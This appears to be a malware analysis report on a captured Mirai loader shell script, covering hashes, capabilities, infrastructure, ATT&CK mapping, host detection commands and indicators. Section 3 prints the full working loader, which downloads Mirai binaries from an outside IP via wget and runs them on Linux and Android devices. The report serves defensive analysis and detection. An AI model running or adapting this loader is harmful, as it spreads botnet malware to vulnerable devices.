# MIRAI_LOADER — Analysis Report

**Sample:** `246c3c37a0de2987d9352411f22ea4805f7e75287f2782d5ee56770219a096a4`
**TLP:WHITE** · Author: AfterPacket · Analysed: 2026-08-08 · Samples: 1

---

## 1. Incident summary

A 409-byte unobfuscated Mirai loader written over telnet to `/wget` on
2026-08-03 from `195.123.171.185`. It fetches `mirai.<arch>` from
`77.90.185.66`, writes the result to `dvrHelper` — the classic Mirai binary
name — and executes it with the tag `tscan`.

The family is self-identifying to the point of carelessness: the URL path is
literally `mirai.<arch>`. Two details raise its significance beyond that. Its
directory list includes `/data/local/tmp`, an **Android** path, so this loader
targets Android and Android-derived embedded devices as well as Linux. And it
is being **actively hunted by a rival operator** in this same capture —
BOTKILL_PROCWIPE sample `2733d565` kills processes by the name `dvrHelper`.

## 2. Phase 1 — Triage

| Field | Value |
|-------|-------|
| SHA-256 | `246c3c37a0de2987d9352411f22ea4805f7e75287f2782d5ee56770219a096a4` |
| MD5 | `3d39989e0700b86e57f81ef0183b0049` |
| SHA-1 | `9e013f23ba30f0622fa092372e2abde18b029e7e` |
| Size | 409 B / 13 lines |
| Type | ASCII text — **no shebang**, begins directly at `DIRS=` |
| Delivery | telnet, shell-write, dropped as `/wget` |
| First seen | 2026-08-03T18:19:44Z |
| VT | no record (sidecar `scan` null — absence of data, not a clean verdict) |

## 3. Phase 2 — Configuration block

The complete file:

```sh
DIRS="/tmp /var /dev /var/tmp /dev/shm /data/local/tmp"
ARCHS="arm arm5 arm7 mips mpsl"
SERVER="77.90.185.66"

for dir in $DIRS; do
  echo > "$dir"/.f && chmod 777 "$dir"/.f && "$dir"/.f && cd "$dir"
done

for arch in $ARCHS; do
  (wget "http://$SERVER/mirai.$arch" -O- || busybox wget "http://$SERVER/mirai.$arch" -O-) > dvrHelper; \
  (chmod +x dvrHelper || chmod 777 dvrHelper); \
  ./dvrHelper tscan
done
```

## 4. Phase 3 — Capabilities

### 4.1 Write-and-execute probing

Lines 5–7 are not a plain `chdir`. The loop creates `.f`, makes it executable,
**runs it**, and only then settles into that directory — selecting the first
location that permits both write *and* exec.

**This makes `noexec` an effective control against this family**, which is
unusual. Mounting `/tmp`, `/var/tmp` and `/dev/shm` with `noexec` causes the
probe to fail and the loader to move on; if every candidate fails, it has
nowhere to stage. Presence of an empty world-writable `.f` in any of those six
directories is a host indicator.

### 4.2 Android targeting

`/data/local/tmp` is an Android path, not conventional Linux. It appears
alongside the usual Linux staging directories, so this loader is built to run on
Android and Android-derived embedded systems — set-top boxes, IP cameras, cheap
NVRs. **An investigation scoped to Linux hosts alone will miss part of the
affected estate.**

### 4.3 Retrieval resilience

`wget ... -O- || busybox wget ... -O-` and `chmod +x || chmod 777` — each step
has a fallback for minimal userlands where the primary tool is absent or a
stripped `chmod` rejects symbolic modes.

### 4.4 Exec tag

`./dvrHelper tscan` — the argument is this family's equivalent of
MIRAI_TELNETCURL's `telnet.curl`, most plausibly "telnet scan". This matters for
detection: `dvrHelper` alone is a shared, widely reused Mirai artefact name and
a poor discriminator, but `dvrHelper tscan` is this loader specifically.

## 5. Phase 4 — C2 protocol

Plain HTTP on port 80 to a bare IP: `http://77.90.185.66/mirai.<arch>`. No
domain anywhere in the sample, so there is no namespace to sinkhole — handle at
the route layer. The literal path component `mirai.` is rare in benign traffic
and makes a high-quality, low-noise network detection string.

**Infrastructure note.** `77.90.185.66` (this payload host) and `77.90.185.42`
(which delivered the PERLBOT sample `/dodu`) sit in the same /24. Recorded as an
observation; shared hosting is at least as likely as a shared operator, and this
is not an attribution claim.

## 6. Phase 5 — Persistence

**None.** The loader fetches, chmods and executes. Any persistence would be a
property of the `dvrHelper` payload, which was **not captured** — the honeypot
recorded the loader only.

## 7. Phase 6 — Attribution

Mirai, **HIGH confidence** and effectively self-declared: the fetch path is
`mirai.<arch>` and the output filename is `dvrHelper`, the binary name from the
original Mirai/dvrHelper lineage. Unobfuscated, short, and unsophisticated
relative to MIRAI_OHSHIT in the same capture.

`dvrHelper` is deliberately **not** sole-condition in the YARA rule: it is a
shared artefact name that appears in unrelated samples, in detection content,
and — in this very capture — inside a rival's kill script. Matching it alone
would misattribute.

## 8. Phase 7 — Host detection

```bash
ps aux | grep dvrHelper
find / -name "dvrHelper" 2>/dev/null
ls -la /tmp/.f /var/.f /dev/.f /var/tmp/.f /dev/shm/.f /data/local/tmp/.f 2>/dev/null
grep -rl "77.90.185.66\|mirai\." /tmp /var/tmp /home /root 2>/dev/null
# Android estate
adb shell ls -la /data/local/tmp/ 2>/dev/null
```

Network: HTTP GET for a URI containing `mirai.` (Suricata 9005001–9005003);
any outbound to `77.90.185.66`.

## 9. Phase 8 — MITRE ATT&CK

| ID | Technique | Implementation |
|----|-----------|----------------|
| T1078.001 | Valid Accounts: Default | telnet with default credentials |
| T1059.004 | Unix Shell | shell loader |
| T1105 | Ingress Tool Transfer | `wget` / `busybox wget` |
| T1222.002 | Linux File Permission Modification | `chmod +x` / `chmod 777` |
| T1083 | File and Directory Discovery | `.f` write-and-exec probe |
| T1036 | Masquerading | `dvrHelper` — plausible device-daemon name |
| T1071.001 | Web Protocols | HTTP staging |

## 10. IOC table

| Type | Value | Confidence |
|------|-------|-----------|
| SHA-256 | `246c3c37a0de2987d9352411f22ea4805f7e75287f2782d5ee56770219a096a4` | — |
| IP | `77.90.185.66` | HIGH — `SERVER=` in config block |
| IP | `195.123.171.185` | HIGH — direct capture, delivery |
| URL | `http://77.90.185.66/mirai.<arch>` | HIGH |
| Filename | `dvrHelper` | MEDIUM — shared Mirai artefact, use with context |
| String | `./dvrHelper tscan` | HIGH — family-specific |
| Path | `"$dir"/.f` in six directories incl. `/data/local/tmp` | HIGH |

**Artifacts:** `yara/MIRAI_LOADER_dvrhelper.yar` ·
`suricata/mirai_loader.rules` (9005001–9005003) · `ioc/MIRAI_LOADER_ioc.txt`
**Related:** `BOTKILL_PROCWIPE_analysis_41d9a2a0.md` — a rival targeting this payload
